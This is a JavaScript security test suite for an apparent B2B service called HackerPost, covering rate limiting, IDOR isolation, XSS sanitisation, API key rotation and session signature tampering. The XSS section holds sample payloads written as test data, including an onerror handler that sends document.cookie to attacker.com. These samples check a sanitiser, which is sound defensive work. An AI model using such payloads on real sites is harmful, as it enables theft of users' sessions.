/**
 * HackerPost B2B Security Verification Suite
 * Tests Rate Limiting, IDOR, XSS, Cryptographic Hashing, and Session Signatures.
 */

import { 
  rateLimiter, 
  sanitizeInput, 
  unescapeInput, 
  hashApiKey, 
  signSessionToken, 
  verifySessionToken, 
  timingSafeMatch, 
  assertResourceOwnership,
  TIER_LIMITS 
} from '../lib/security.js';

import { 
  findOrCreateGoogleUser, 
  getUserById, 
  createApiKey, 
  rotateApiKey, 
  revokeApiKey, 
  getUserApiKeys, 
  validateBearerKey 
} from '../lib/userStore.js';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`\x1b[32m✓ [PASS]\x1b[0m ${message}`);
  } else {
    failedTests++;
    console.error(`\x1b[31m✗ [FAIL]\x1b[0m ${message}`);
  }
}

async function runSecurityTests() {
  console.log('\n======================================================');
  console.log('   HACKERPOST B2B SECURITY & AUTH VERIFICATION SUITE   ');
  console.log('======================================================\n');

  // ----------------------------------------------------
  // TEST 1: Rate Limiting & Sliding Window Abuse Protection
  // ----------------------------------------------------
  console.log('--- 1. Testing Sliding Window Rate Limiter ---');
  const testId = `test_rl_${Date.now()}`;
  rateLimiter.reset(testId);

  // Consume 5 requests (Limit: 5)
  for (let i = 1; i <= 5; i++) {
    const res = rateLimiter.check(testId, 5, 10);
    assert(res.allowed === true && res.remaining === 5 - i, `Request #${i} within rate limit allowed (remaining: ${res.remaining})`);
  }

  // 6th request should be blocked with 429
  const blockedRes = rateLimiter.check(testId, 5, 10);
  assert(blockedRes.allowed === false && blockedRes.remaining === 0, 'Excess request rejected by rate limiter (HTTP 429 state)');
  assert(blockedRes.retryAfter > 0, `Retry-After header is correctly calculated (${blockedRes.retryAfter}s)`);

  // ----------------------------------------------------
  // TEST 2: IDOR (Insecure Direct Object Reference) Protection
  // ----------------------------------------------------
  console.log('\n--- 2. Testing IDOR & Tenant Isolation ---');
  const userA = findOrCreateGoogleUser({
    googleId: `google_user_a_${Date.now()}`,
    email: `alice_${Date.now()}@security.corp`,
    name: 'Alice SecOps',
    ip: '192.168.1.10'
  });

  const userB = findOrCreateGoogleUser({
    googleId: `google_user_b_${Date.now()}`,
    email: `bob_${Date.now()}@security.corp`,
    name: 'Bob Threat Hunter',
    ip: '192.168.1.11'
  });

  assert(userA.user.id !== userB.user.id, 'Distinct tenant accounts provisioned');

  // User A gets an API Key
  const userAKey = createApiKey(userA.user.id, 'Pro', 'Alice Production Key', '192.168.1.10');
  assert(userAKey.rawKey && userAKey.key.id, 'User A API Key generated');

  // User B tries to rotate User A's API key (IDOR Attack simulation)
  let idorRotateBlocked = false;
  try {
    rotateApiKey(userB.user.id, userAKey.key.id, '192.168.1.11');
  } catch (err) {
    idorRotateBlocked = err.message.includes('access denied') || err.message.includes('not found');
  }
  assert(idorRotateBlocked, 'IDOR Attack Blocked: User B cannot rotate User A\'s API key (403)');

  // User B tries to revoke User A's API key (IDOR Attack simulation)
  let idorRevokeBlocked = false;
  try {
    revokeApiKey(userB.user.id, userAKey.key.id, '192.168.1.11');
  } catch (err) {
    idorRevokeBlocked = err.message.includes('access denied') || err.message.includes('not found');
  }
  assert(idorRevokeBlocked, 'IDOR Attack Blocked: User B cannot revoke User A\'s API key (403)');

  // User B queries their own keys - must not include User A's key
  const userBKeys = getUserApiKeys(userB.user.id);
  const leakedKey = userBKeys.find(k => k.id === userAKey.key.id);
  assert(!leakedKey, 'Tenant Data Isolated: User B cannot list or view User A\'s API keys');

  // ----------------------------------------------------
  // TEST 3: XSS & Payload Sanitization Defenses
  // ----------------------------------------------------
  console.log('\n--- 3. Testing XSS & Payload Sanitization ---');
  const xssPayload1 = '<script>alert("XSS_COMPROMISED")</script>CVE-2026-9999 Exploit';
  const clean1 = sanitizeInput(xssPayload1);
  assert(!clean1.includes('<script>') && !clean1.includes('alert('), 'Harmful script tags and JS invocations stripped');

  const xssPayload2 = '<img src=x onerror="fetch(`https://attacker.com?c=`+document.cookie)" />Advisory text';
  const clean2 = sanitizeInput(xssPayload2);
  assert(!clean2.includes('onerror') && !clean2.includes('fetch'), 'Inline DOM event handlers (onerror=, onload=) stripped');

  const xssPayload3 = '<iframe src="javascript:alert(1)"></iframe>';
  const clean3 = sanitizeInput(xssPayload3);
  assert(!clean3.includes('<iframe') && !clean3.includes('javascript:'), 'Malicious iframe and javascript: pseudo-protocols stripped');

  // ----------------------------------------------------
  // TEST 4: Zero-Plaintext Cryptographic API Key Hashing
  // ----------------------------------------------------
  console.log('\n--- 4. Testing Zero-Plaintext Storage & Key Lifecycle ---');
  const rawKey = userAKey.rawKey;
  const computedHash = hashApiKey(rawKey);

  // Validate the key
  const validation = validateBearerKey(rawKey);
  assert(validation.valid === true, 'Bearer API key authenticates against SHA-256 hash in storage');
  assert(validation.userId === userA.user.id, 'Authenticated request mapped to correct user ID');

  // Corrupted/tampered key should fail
  const corruptedKey = rawKey.slice(0, -3) + 'xyz';
  const invalidValidation = validateBearerKey(corruptedKey);
  assert(invalidValidation.valid === false && invalidValidation.status === 401, 'Corrupted key rejected with 401 Unauthorized');

  // Rotate Key
  const rotated = rotateApiKey(userA.user.id, userAKey.key.id);
  assert(rotated.rawKey && rotated.newKey.id !== userAKey.key.id, 'Key rotated: new secret key issued');

  // Old key must now be rejected
  const oldKeyValidation = validateBearerKey(rawKey);
  assert(oldKeyValidation.valid === false && oldKeyValidation.status === 401, 'Revoked old key rejected with 401 Unauthorized');

  // New rotated key must be valid
  const newKeyValidation = validateBearerKey(rotated.rawKey);
  assert(newKeyValidation.valid === true, 'Newly rotated key authenticates successfully');

  // ----------------------------------------------------
  // TEST 5: Cryptographic Session Signature & Tamper Detection
  // ----------------------------------------------------
  console.log('\n--- 5. Testing HMAC Session Signatures & Tampering ---');
  const sessionToken = signSessionToken({
    userId: userA.user.id,
    email: userA.user.email,
    role: 'developer'
  });

  const verifiedSession = verifySessionToken(sessionToken);
  assert(verifiedSession && verifiedSession.userId === userA.user.id, 'Valid HMAC signed session verified successfully');

  // Tamper with payload (e.g. elevate to admin or change user ID)
  const [dataPart, sigPart] = sessionToken.split('.');
  const decodedJson = JSON.parse(Buffer.from(dataPart, 'base64url').toString('utf8'));
  decodedJson.role = 'super_admin';
  decodedJson.userId = 'usr_target_victim';
  const tamperedDataPart = Buffer.from(JSON.stringify(decodedJson)).toString('base64url');
  const tamperedToken = `${tamperedDataPart}.${sigPart}`;

  const tamperedResult = verifySessionToken(tamperedToken);
  assert(tamperedResult === null, 'Session Tampering Detected: Modified session signature rejected');

  // Expired session verification
  const expiredToken = signSessionToken({ userId: userA.user.id }, -1000); // expired 1s ago
  const expiredResult = verifySessionToken(expiredToken);
  assert(expiredResult === null, 'Expired session token rejected');

  // ----------------------------------------------------
  // TEST SUMMARY
  // ----------------------------------------------------
  console.log('\n======================================================');
  console.log(`   TEST RESULTS: ${passedTests}/${totalTests} Passed (${failedTests} Failed)   `);
  console.log('======================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runSecurityTests().catch(err => {
  console.error("Test runner exception:", err);
  process.exit(1);
});
